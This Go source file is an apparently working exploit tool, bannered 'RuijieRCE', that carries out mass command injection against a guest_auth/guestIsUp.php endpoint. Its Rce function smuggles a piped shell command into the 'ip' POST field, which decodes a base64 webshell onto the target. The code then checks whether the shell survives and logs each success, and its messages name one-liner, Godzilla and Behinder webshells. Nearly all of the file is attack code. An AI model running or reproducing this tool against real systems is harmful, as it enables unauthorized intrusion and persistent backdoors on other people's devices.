package funcs

import (
	"bufio"
	"bytes"
	"crypto/tls"
	"fmt"
	"io"
	"io/ioutil"
	"math/rand"
	"net/http"
	"net/http/cookiejar"
	"net/url"
	"os"
	"strconv"
	"strings"
	"sync"
	"time"
)

func addHistory(word string)  {
	//检测到漏洞时将URL信息写入history.txt
	file, err := os.OpenFile(
		"history.txt",
		os.O_WRONLY|os.O_APPEND|os.O_CREATE,
		0666,
	)
	if err != nil {
		fmt.Printf("\033[1;32m%s%v\033[0m\n","[-]无法写入history.txt", err)
	}
	var mu sync.Mutex
	defer mu.Unlock()
	mu.Lock()
	{
		defer file.Close()
		// 写字节到文件中
		word = word + "\n"
		byteSlice := []byte(word)
		_ , err = file.Write(byteSlice)
		if err != nil {
			fmt.Printf("\033[1;32m%s%v\033[0m\n","[-]无法写入history.txt", err)
		}
	}
}

func Check(target string, header map[string]string) (bool, error) {
	//检测是否成功写入shell
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	cookieJar, _ := cookiejar.New(nil)
	var client = &http.Client{
		Timeout: time.Second * 5,
		Jar: cookieJar,
		Transport: tr,
	}
	req, err := http.NewRequest("GET", target, nil)
	if err != nil {
		return false, err
	}
	req.Header.Add("User-Agent", header["User-Agent"])
	req.Header.Add("Accept", header["Accept"])
	reqs, err := client.Do(req)
	if err != nil {
		return false, err
	}
	body, _ := ioutil.ReadAll(reqs.Body)
	defer reqs.Body.Close()

	if reqs.StatusCode == 200 && strings.Contains(string(body), "File not found") == false && strings.Contains(string(body), "Authorization Required") == false{
		//addHistory(target)
		return true, nil
	}else {
		return false, nil
	}
}

func Url(s string) (string,string) {
	urll, _ := url.Parse(s)
	target := urll.Scheme + "://" + urll.Host + "/guest_auth/"
	rand.Seed(time.Now().UnixNano())
	shellname := strconv.Itoa(rand.Int())[0:8] + ".php"
	return target, shellname
}

func Rce(s, shellname, shellcode string, header map[string]string) (string, error) {
	//写入shell
	target := s + "guestIsUp.php"
	data := "ip=127.0.0.1 | echo \"" + shellcode + "\" | base64 -d > " + shellname + " &mac=00-00"
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	cookieJar, _ := cookiejar.New(nil)
	var client = &http.Client{
		Timeout: time.Second * 5,
		Jar: cookieJar,
		Transport: tr,
	}
	req, err := http.NewRequest("POST", target,bytes.NewReader([]byte(data)))
	if err != nil {
		return "", err
	}
	req.Header.Set("Content-Type", header["Content-Type"])
	req.Header.Add("User-Agent", header["User-Agent"])
	req.Header.Add("Accept", header["Accept"])
	req.Header.Add("Accept-Encoding", header["Accept-Encoding"])

	_, err = client.Do(req)
	if err != nil {
		return "", err
	}

	urll := s + shellname
	check, err := Check(urll, header)
	switch  {
	case err != nil:
		return "", err
	case check == true:
		return urll, nil
	default:
		return "", nil
	}
}

func failure(url, name string) {
	switch  {
	case name == "shellcode":
		fmt.Printf("\033[1;32m%s\033[0m\n", "[-]" + url + "写入一句话马失败！")
	case name == "Godzilla":
		fmt.Printf("\033[1;32m%s\033[0m\n", "[-]" + url + "写入哥斯拉马失败！")
	case name == "Behinder":
		fmt.Printf("\033[1;32m%s\033[0m\n", "[-]" + url + "写入冰蝎马失败！")
	default:
		fmt.Printf("\033[1;32m%s\033[0m\n", "[-]" + url + "写入shell失败！")
	}
}

func Judge(urll, name string, header map[string]string)  {
	//3秒后检测写入木马是否被删除
	time.Sleep(3 * time.Second)
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	cookieJar, _ := cookiejar.New(nil)
	var client = &http.Client{
		Timeout: time.Second * 5,
		Jar: cookieJar,
		Transport: tr,
	}
	req, err := http.NewRequest("GET", urll, nil)
	if err != nil {
		failure(urll, name)
		return
	}
	req.Header.Set("Content-Type", header["Content-Type"])
	req.Header.Add("User-Agent", header["User-Agent"])
	req.Header.Add("Accept", header["Accept"])
	req.Header.Add("Accept-Encoding", header["Accept-Encoding"])

	reqs, err := client.Do(req)
	if err != nil {
		failure(urll, name)
		return
	}
	if reqs.StatusCode != 200 {
		failure(urll, name)
		return
	}
	addHistory(urll)
	fmt.Printf("\033[1;31m%s\033[0m\n","[+]成功写入shell：" + urll)
	return
}

func GetFileUrl(file string) map[int]string {
	fi, err := os.Open(file)
	if err != nil {
		fmt.Printf("\033[1;31m%s%v\033[0m\n","请输入正确的文件信息", err)
	}
	defer fi.Close()

	target := make(map[int]string)
	i := 0
	br := bufio.NewReader(fi)
	for  {
		urll, _, eof := br.ReadLine()
		if eof == io.EOF {
			break
		}
		target[i] = string(urll)
		i++
	}
	return target
}

func Menu()  {
	now := time.Now()
	fmt.Printf("\033[1;35m%s\033[0m\n","  _____       _ _ _      _____   _____ ______ ")
	fmt.Printf("\033[1;35m%s\033[0m\n"," |  __ \\     (_|_|_)    |  __ \\ / ____|  ____|")
	fmt.Printf("\033[1;35m%s\033[0m\n"," | |__) |   _ _ _ _  ___| |__) | |    | |__   ")
	fmt.Printf("\033[1;35m%s\033[0m\n"," |  _  / | | | | | |/ _ \\  _  /| |    |  __|  ")
	fmt.Printf("\033[1;35m%s\033[0m\n"," | | \\ \\ |_| | | | |  __/ | \\ \\| |____| |____ ")
	fmt.Printf("\033[1;35m%s\033[0m\n"," |_|  \\_\\__,_|_| |_|\\___|_|  \\_\\\\_____|______|")
	fmt.Printf("\033[1;35m%s\033[0m\n","              _/ |                            ")
	fmt.Printf("\033[1;35m%s\033[0m\n","             |__/                             ")
	fmt.Printf("\033[1;35m%d-%02d-%02d %02d:%02d:%02d\033[0m\n", now.Year(), now.Month(), now.Day(), now.Hour(), now.Minute(), now.Second())
}

